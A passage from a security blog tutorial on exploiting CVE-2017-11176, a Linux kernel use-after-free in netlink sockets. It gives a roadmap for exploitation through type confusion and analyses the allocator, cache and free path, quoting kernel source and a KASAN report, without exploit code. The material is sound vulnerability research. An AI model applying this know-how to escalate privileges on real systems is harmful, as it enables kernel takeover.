<span class="o">*</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">54</span><span class="p">;</span><span class="w"></span>
<span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span><span class="w"></span>
<span class="o">*</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">42</span><span class="p">;</span><span class="w"> </span><span class="c1">// &lt;----- use-after-free</span>
</code></pre></div><p>The reason why this is a bug is that nobody knows what is in memory (pointed by <em>ptr</em>) after the call to <em>free(ptr)</em>. It is called a <strong>dangling pointer</strong>. Reading and/or writing operations are an undefined behavior. In the best scenario case, this will just be a <em>no-op</em>. In the worst scenario case, this can crash an application (or the kernel).</p><h2 id="information-gathering">Information Gathering</h2><p>Exploiting <em>use-after-free</em> bugs in kernel often follows the same scheme. Before trying to, you must be able to answer those questions:</p><ol><li>What is the allocator? How does it work?</li><li>What object are we talking about?</li><li>What <em>cache</em> does it belong to? Object size? Dedicated/general?</li><li>Where is it allocated/freed?</li><li>Where the object is being used after being freed? How (reading/writing)?</li></ol><p>To answer those questions, the Google guys developed a nice Linux patch: <a href="https://www.kernel.org/doc/html/v4.14/dev-tools/kasan.html">KASAN</a> (Kernel Address SANitizer). A typical output is:</p><div class="highlight"><pre><span></span><code>================================================================== 
BUG: KASAN: use-after-free in debug_spin_unlock                             // &lt;--- the "where"
kernel/locking/spinlock_debug.c:97 [inline] 
BUG: KASAN: use-after-free in do_raw_spin_unlock+0x2ea/0x320 
kernel/locking/spinlock_debug.c:134 
Read of size 4 at addr ffff88014158a564 by task kworker/1:1/5712            // &lt;--- the "how"

CPU: 1 PID: 5712 Comm: kworker/1:1 Not tainted 4.11.0-rc3-next-20170324+ #1 
Hardware name: Google Google Compute Engine/Google Compute Engine, 
BIOS Google 01/01/2011 
Workqueue: events_power_efficient process_srcu 
Call Trace:                                                                 // &lt;--- call trace that reach it
 __dump_stack lib/dump_stack.c:16 [inline] 
 dump_stack+0x2fb/0x40f lib/dump_stack.c:52 
 print_address_description+0x7f/0x260 mm/kasan/report.c:250 
 kasan_report_error mm/kasan/report.c:349 [inline] 
 kasan_report.part.3+0x21f/0x310 mm/kasan/report.c:372 
 kasan_report mm/kasan/report.c:392 [inline] 
 __asan_report_load4_noabort+0x29/0x30 mm/kasan/report.c:392 
 debug_spin_unlock kernel/locking/spinlock_debug.c:97 [inline] 
 do_raw_spin_unlock+0x2ea/0x320 kernel/locking/spinlock_debug.c:134 
 __raw_spin_unlock_irq include/linux/spinlock_api_smp.h:167 [inline] 
 _raw_spin_unlock_irq+0x22/0x70 kernel/locking/spinlock.c:199 
 spin_unlock_irq include/linux/spinlock.h:349 [inline] 
 srcu_reschedule+0x1a1/0x260 kernel/rcu/srcu.c:582 
 process_srcu+0x63c/0x11c0 kernel/rcu/srcu.c:600 
 process_one_work+0xac0/0x1b00 kernel/workqueue.c:2097 
 worker_thread+0x1b4/0x1300 kernel/workqueue.c:2231 
 kthread+0x36c/0x440 kernel/kthread.c:231 
 ret_from_fork+0x31/0x40 arch/x86/entry/entry_64.S:430 

Allocated by task 20961:                                                      // &lt;--- where is it allocated
 save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59 
 save_stack+0x43/0xd0 mm/kasan/kasan.c:515 
 set_track mm/kasan/kasan.c:527 [inline] 
 kasan_kmalloc+0xaa/0xd0 mm/kasan/kasan.c:619 
 kmem_cache_alloc_trace+0x10b/0x670 mm/slab.c:3635 
 kmalloc include/linux/slab.h:492 [inline] 
 kzalloc include/linux/slab.h:665 [inline] 
 kvm_arch_alloc_vm include/linux/kvm_host.h:773 [inline] 
 kvm_create_vm arch/x86/kvm/../../../virt/kvm/kvm_main.c:610 [inline] 
 kvm_dev_ioctl_create_vm arch/x86/kvm/../../../virt/kvm/kvm_main.c:3161 [inline] 
 kvm_dev_ioctl+0x1bf/0x1460 arch/x86/kvm/../../../virt/kvm/kvm_main.c:3205 
 vfs_ioctl fs/ioctl.c:45 [inline] 
 do_vfs_ioctl+0x1bf/0x1780 fs/ioctl.c:685 
 SYSC_ioctl fs/ioctl.c:700 [inline] 
 SyS_ioctl+0x8f/0xc0 fs/ioctl.c:691 
 entry_SYSCALL_64_fastpath+0x1f/0xbe 

Freed by task 20960:                                                          // &lt;--- where it has been freed
 save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59 
 save_stack+0x43/0xd0 mm/kasan/kasan.c:515 
 set_track mm/kasan/kasan.c:527 [inline] 
 kasan_slab_free+0x6e/0xc0 mm/kasan/kasan.c:592 
 __cache_free mm/slab.c:3511 [inline] 
 kfree+0xd3/0x250 mm/slab.c:3828 
 kvm_arch_free_vm include/linux/kvm_host.h:778 [inline] 
 kvm_destroy_vm arch/x86/kvm/../../../virt/kvm/kvm_main.c:732 [inline] 
 kvm_put_kvm+0x709/0x9a0 arch/x86/kvm/../../../virt/kvm/kvm_main.c:747 
 kvm_vm_release+0x42/0x50 arch/x86/kvm/../../../virt/kvm/kvm_main.c:758 
 __fput+0x332/0x800 fs/file_table.c:209 
 ____fput+0x15/0x20 fs/file_table.c:245 
 task_work_run+0x197/0x260 kernel/task_work.c:116 
 exit_task_work include/linux/task_work.h:21 [inline] 
 do_exit+0x1a53/0x27c0 kernel/exit.c:878 
 do_group_exit+0x149/0x420 kernel/exit.c:982 
 get_signal+0x7d8/0x1820 kernel/signal.c:2318 
 do_signal+0xd2/0x2190 arch/x86/kernel/signal.c:808 
 exit_to_usermode_loop+0x21c/0x2d0 arch/x86/entry/common.c:157 
 prepare_exit_to_usermode arch/x86/entry/common.c:194 [inline] 
 syscall_return_slowpath+0x4d3/0x570 arch/x86/entry/common.c:263 
 entry_SYSCALL_64_fastpath+0xbc/0xbe 

The buggy address belongs to the object at ffff880141581640 
 which belongs to the cache kmalloc-65536 of size 65536                         // &lt;---- the object's cache
The buggy address is located 36644 bytes inside of 
 65536-byte region [ffff880141581640, ffff880141591640) 
The buggy address belongs to the page:                                          // &lt;---- even more info
page:ffffea000464b400 count:1 mapcount:0 mapping:ffff880141581640 
index:0x0 compound_mapcount: 0 
flags: 0x200000000008100(slab|head) 
raw: 0200000000008100 ffff880141581640 0000000000000000 0000000100000001 
raw: ffffea00064b1f20 ffffea000640fa20 ffff8801db800d00 
page dumped because: kasan: bad access detected 

Memory state around the buggy address: 
 ffff88014158a400: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb 
 ffff88014158a480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb 
&gt;ffff88014158a500: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb 
                                                       ^ 
 ffff88014158a580: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb 
 ffff88014158a600: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb 
================================================================== 
</code></pre></div><p>Pretty neat, isn't it?</p><p><strong>NOTE</strong>: The previous error report has been taken from <a href="https://groups.google.com/forum/#!msg/syzkaller/Sl0POwca6-s/QR_z6AsFCQAJ">syzkaller</a>, another nice tool.</p><p>Unfortunately, you might not be able to run KASAN in your lab setup. As far as we remember, KASAN requires a minimum kernel version of 4.x and does not support every architecture. In that case, you will need to do this job <em>by hand</em>.</p><p>In addition, KASAN only shows you one place where the use-after-free occurs. In reality, there could be <strong>more dangling pointers</strong> (more on this later). Identifying them requires additional code review.</p><h2 id="exploiting-use-after-free-with-type-confusion">Exploiting Use-After-Free with Type Confusion</h2><p>There are multiple ways to exploit a <em>use-after-free</em> bug. For instance, one can try to play with allocator meta-data. Doing it this way in the kernel can be a bit tricky. It also increases the difficulty that you will face while trying to <em>repair</em> the kernel by the end of the exploit. Reparation will be covered in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">part 4</a>. This is not a skippable step, otherwise the kernel can crash when your exploit exits (we already experienced it).</p><p>A common way to exploit UAF in the Linux kernel is through <strong>type confusion</strong>. A type confusion occurs when the kernel misinterprets the data type. It uses a data (generally a pointer) that it thinks has one type, while it actually points to another type of data. Because it is developed in C, type checking is performed during compilation. <strong>The cpu actually doesn't care about <em>types</em>, it only dereferences addresses with fixed offsets</strong>.</p><p>In order to exploit an UAF with type confusion, the roadmap is:</p><ol><li>Prepare the kernel in a suitable state (e.g. make a socket ready to block)</li><li>Trigger the bug that frees the targeted object while keeping dangling pointers untouched</li><li>Immediately <em>re-allocate</em> with another object where you can control data</li><li>Trigger a use-after-free's <em>primitive</em> from the dangling pointers</li><li>Ring-0 takeover</li><li>Repair the kernel and clean everything</li><li>Enjoy!</li></ol><p>If you tailored your exploit correctly, the only step that can actually fail is the step 3). We will see why.</p><p><strong>WARNING</strong>: Exploiting <em>use-after-free</em> with "type confusion" imposes that the target object belongs to a <strong>general purpose cache</strong>. If this is not the case, there are techniques to deal with that but this is a bit more "advanced", we won't cover it here.</p><hr><h1 id="analyze-the-uaf-cache-allocation-free">Analyze the UAF (cache, allocation, free)</h1><p>In this section, we will answer the questions from the previous <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#information-gathering">information gathering</a> step.</p><h2 id="what-is-the-allocator-how-does-it-work">What is the allocator? How does it work?</h2><p>In our target, the allocator is the SLAB allocator. As mentioned in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#core-concepts-3">core concepts 3</a>, we can retrieve this information from the <em>kernel config file</em>. Another way to do this is to check the name of the general purpose caches from <strong>/proc/slabinfo</strong>. Are they prefixed by <em>"size-"</em> or <em>"kmalloc-"</em>?</p><p>We also have a better view on what data structure it manipulates, especially the <strong>array_cache</strong>.</p><p><strong>NOTE</strong>: If you do not master your allocator yet (especially the kmalloc()/kfree() code paths), it might be time to study it now.</p><h2 id="what-object-are-we-talking-about">What object are we talking about?</h2><p>If it hasn't been obvious yet from <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">part 1</a> and <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">part 2</a>, the object that is subject to a <em>use-after-free</em> is: <strong>struct netlink_sock</strong>. It has the following definition:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/net/netlink_sock.h]</span>

<span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="cm">/* struct sock has to be the first member of netlink_sock */</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w">     </span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">pid</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">dst_pid</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">dst_group</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">flags</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">subscriptions</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">ngroups</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">       </span><span class="o">*</span><span class="n">groups</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">       </span><span class="n">state</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">wait_queue_head_t</span><span class="w">   </span><span class="n">wait</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">netlink_callback</span><span class="w"> </span><span class="o">*</span><span class="n">cb</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">mutex</span><span class="w">        </span><span class="o">*</span><span class="n">cb_mutex</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">mutex</span><span class="w">        </span><span class="n">cb_def_mutex</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">void</span><span class="w">            </span><span class="p">(</span><span class="o">*</span><span class="n">netlink_rcv</span><span class="p">)(</span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">module</span><span class="w">       </span><span class="o">*</span><span class="n">module</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>Note that this is quite obvious in our case. Sometimes, it might take a while to figure out the object in UAF. Especially, when a particular object has the ownership of various sub-objects (i.e. it handles their lifecycle). The UAF might lie in one of those sub-objects (i.e. not the <em>top/master</em> one).</p><h2 id="where-is-it-freed">Where is it freed?</h2><p>In <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#why-setting-sock-to-null-matters">part 1</a> we saw that while entering <em>mq_notify()</em> the netlink's sock refcounter was set to one. The refcounter gets increased by one with <em>netlink_getsockbyfilp)</em>, decreased by one with <em>netlink_attachskb()</em> and then decreased by one (another time) in <em>netlink_detachskb()</em>. Which gaves us the following call trace:</p><div class="highlight"><pre><span></span><code>- mq_notify
- netlink_detachskb
- sock_put          // &lt;----- atomic_dec_and_test(&amp;sk-&gt;sk_refcnt)
</code></pre></div><p>Because the refcounter reaches zero, it is then freed by calling <strong>sk_free()</strong>:</p><div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">sk_free</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="cm">/*</span>
<span class="cm">     * We subtract one from sk_wmem_alloc and can know if</span>
<span class="cm">     * some packets are still in some tx queue.</span>
<span class="cm">     * If not null, sock_wfree() will call __sk_free(sk) later</span>
<span class="cm">     */</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">atomic_dec_and_test</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_wmem_alloc</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="n">__sk_free</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Remember that <strong>sk-&gt;sk_wmem_alloc</strong> is the "current" size of sending buffer. During netlink_sock initialization, this is set to one. Because we did not send any message from the target socket, it is still one when entering <em>sk_free()</em>. That is, it will call <strong>__sk_free()</strong>:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="c1">// [net/core/sock.c]</span>

<span class="w">      </span><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__sk_free</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">sk_filter</span><span class="w"> </span><span class="o">*</span><span class="n">filter</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_destruct</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_destruct</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut ...</span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="n">sk_prot_free</span><span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_prot_creator</span><span class="p">,</span><span class="w"> </span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>In [0], __sk_free() gives the opportunity to the sock to call a "specialized" destructor. In [1], it calls <strong>sk_prot_free()</strong> with the <em>sk_prot_create</em> argument of type <strong>struct proto</strong>. Finally, <strong>the object is freed depending on its cache</strong> (cf. next section):</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sk_prot_free</span><span class="p">(</span><span class="k">struct</span> <span class="nc">proto</span><span class="w"> </span><span class="o">*</span><span class="n">prot</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">kmem_cache</span><span class="w"> </span><span class="o">*</span><span class="n">slab</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">module</span><span class="w"> </span><span class="o">*</span><span class="n">owner</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prot</span><span class="o">-&gt;</span><span class="n">owner</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">slab</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prot</span><span class="o">-&gt;</span><span class="n">slab</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">security_sk_free</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">slab</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">kmem_cache_free</span><span class="p">(</span><span class="n">slab</span><span class="p">,</span><span class="w"> </span><span class="n">sk</span><span class="p">);</span><span class="w">    </span><span class="c1">// &lt;----- this one or...</span>
<span class="w">    </span><span class="k">else</span><span class="w"></span>
<span class="w">        </span><span class="n">kfree</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w">                    </span><span class="c1">// &lt;----- ...this one ?</span>
<span class="w">    </span><span class="n">module_put</span><span class="p">(</span><span class="n">owner</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>That is, the final "free" calltrace is:</p><div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="n">what</span><span class="w"> </span><span class="n">ever</span><span class="w"> </span><span class="n">calls</span><span class="w"> </span><span class="n">sock_put</span><span class="p">()</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">netlink_sock</span><span class="w"> </span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">g</span><span class="p">.</span><span class="w"> </span><span class="n">netlink_detachskb</span><span class="p">())</span><span class="w"> </span><span class="o">&gt;&gt;&gt;</span><span class="w"></span>
<span class="o">-</span><span class="w"> </span><span class="n">sock_put</span><span class="w"></span>
<span class="o">-</span><span class="w"> </span><span class="n">sk_free</span><span class="w"></span>
<span class="o">-</span><span class="w"> </span><span class="n">__sk_free</span><span class="w"></span>
<span class="o">-</span><span class="w"> </span><span class="n">sk_prot_free</span><span class="w"></span>
<span class="o">-</span><span class="w"> </span><span class="n">kmem_cache_free</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">kfree</span><span class="w"></span>
</code></pre></div><p><strong>NOTE</strong>: Remember that both <em>sk</em> and <em>netlink_sock</em> address <strong>aliases</strong> (cf. <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">part 1</a>). That is, freeing the <em>struct sock</em> pointer will release the whole <em>netlink_sock</em> object!</p><p>We need to resolve the last function call. To do this, we need to know which cache it belongs to...</p><h2 id="what-cache-does-it-belong-to">What cache does it belong to?</h2><p>Remember that Linux is an object-oriented system with lots of abstraction? We already saw multiple layers of abstractions, hence specialization (cf. Core Concept #1).</p><p>The <em>struct proto</em> brings another layer of abstraction, we have:</p><ol><li>socket's file type (struct file) specialized with: <strong>socket_file_ops</strong></li><li>netlink's BSD socket (struct socket) specialized with: <strong>netlink_ops</strong></li><li>netlink's sock (struct sock) specialized with: <strong>netlink_proto</strong> and <strong>netlink_family_ops</strong></li></ol><p><strong>NOTE</strong>: We will get back to <em>netlink_family_ops</em> in the next section.</p><p>Unlike <em>socket_file_ops</em> and <em>netlink_ops</em> which are mostly just a VFT, the <em>struct proto</em> is a bit more complex. It holds a VFT of course, but it also describes information about the life cycle of the "struct sock". In particular, "how" a <em>specialized struct sock</em> object can be allocated.</p><p>In our case, the two most important fields are <strong>slab</strong> and <strong>obj_size</strong>:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/net/sock.h]</span>

<span class="k">struct</span> <span class="nc">proto</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">kmem_cache</span><span class="w"> </span><span class="o">*</span><span class="n">slab</span><span class="p">;</span><span class="w">      </span><span class="c1">// the "dedicated" cache (if any)</span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">obj_size</span><span class="p">;</span><span class="w">        </span><span class="c1">// the "specialized" sock object size</span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">module</span><span class="w"> </span><span class="o">*</span><span class="n">owner</span><span class="p">;</span><span class="w">         </span><span class="c1">// used for Linux module's refcounting</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>For netlink_sock object, the struct proto is <em>netlink_proto</em>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="k">struct</span> <span class="nc">proto</span><span class="w"> </span><span class="n">netlink_proto</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">name</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="s">"NETLINK"</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">owner</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="n">THIS_MODULE</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">obj_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="p">),</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p><strong>The <em>obj_size</em> does <em>NOT</em> give the final size of the allocation, just a part of it (cf. next section).</strong></p><p>As we can see, lots of fields are left empty (i.e. NULL). Does it mean that <em>netlink_proto</em> do not have a dedicated cache? Well, we can't conclude yet because the <em>slab</em> field is defined during <strong>protocol registration</strong>. We will not cover how protocol registration works, but we need a bit of understanding however.</p><p>In Linux, network modules are either loaded at boot time, or in a "lazy" way with modules (i.e. the first time a particular socket is used). In either case, the "init" function is called. In the netlink case, this function is <strong>netlink_proto_init()</strong>. It does (at least) two things:</p><ol><li>call <strong>proto_register(&amp;netlink_proto, 0)</strong></li><li>call <strong>sock_register(&amp;netlink_family_ops)</strong></li></ol><p><strong>The <em>proto_register()</em> determines whether the protocol must use a <em>dedicated cache</em> or not.</strong> If so, it creates a dedicated <em>kmem_cache</em> otherwise, it will use the general purpose caches. This depends on the <em>alloc_slab</em> parameter (2nd argument) and is implemented with:</p><div class="highlight"><pre><span></span><code><span class="c1">// [net/core/sock.c]</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">proto_register</span><span class="p">(</span><span class="k">struct</span> <span class="nc">proto</span><span class="w"> </span><span class="o">*</span><span class="n">prot</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">alloc_slab</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">alloc_slab</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">prot</span><span class="o">-&gt;</span><span class="n">slab</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kmem_cache_create</span><span class="p">(</span><span class="n">prot</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w">            </span><span class="c1">// &lt;----- creates a kmem_cache named "prot-&gt;name"</span>
<span class="w">                    </span><span class="n">sk_alloc_size</span><span class="p">(</span><span class="n">prot</span><span class="o">-&gt;</span><span class="n">obj_size</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">         </span><span class="c1">// &lt;----- uses the "prot-&gt;obj_size"</span>
<span class="w">                    </span><span class="n">SLAB_HWCACHE_ALIGN</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">proto_slab_flags</span><span class="p">(</span><span class="n">prot</span><span class="p">),</span><span class="w"></span>
<span class="w">                    </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">prot</span><span class="o">-&gt;</span><span class="n">slab</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">printk</span><span class="p">(</span><span class="n">KERN_CRIT</span><span class="w"> </span><span class="s">"%s: Can't create sock SLAB cache!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"></span>
<span class="w">                   </span><span class="n">prot</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="c1">// ... cut (allocates other things) ...</span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="c1">// ... cut (register in the proto_list) ...</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut (error handling) ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>This is the only place where a protocol has the chance to have a dedicated cache or not! Since, <em>netlink_proto_init()</em> calls <em>proto_register</em> with <em>alloc_slab</em> set to zero, <strong>the netlink protocol uses <em>one</em> of the general cache</strong>. As you might guess, the general cache in question will depend on the proto's <em>obj_size</em>. We will see this in the next section.</p><h2 id="where-is-it-allocated">Where is it allocated?</h2><p>So far, we know that during "protocol registration", the netlink family registers a <strong>struct net_proto_family</strong> that is <em>netlink_family_ops</em>. This structure is pretty straighforward (a <em>create</em> callback):</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">net_proto_family</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w">     </span><span class="n">family</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w">     </span><span class="p">(</span><span class="o">*</span><span class="n">create</span><span class="p">)(</span><span class="k">struct</span> <span class="nc">net</span><span class="w"> </span><span class="o">*</span><span class="n">net</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"></span>
<span class="w">                  </span><span class="kt">int</span><span class="w"> </span><span class="n">protocol</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">kern</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">module</span><span class="w">   </span><span class="o">*</span><span class="n">owner</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="k">struct</span> <span class="nc">net_proto_family</span><span class="w"> </span><span class="n">netlink_family_ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PF_NETLINK</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">create</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_create</span><span class="p">,</span><span class="w">               </span><span class="c1">// &lt;-----</span>
<span class="w">    </span><span class="p">.</span><span class="n">owner</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">THIS_MODULE</span><span class="p">,</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
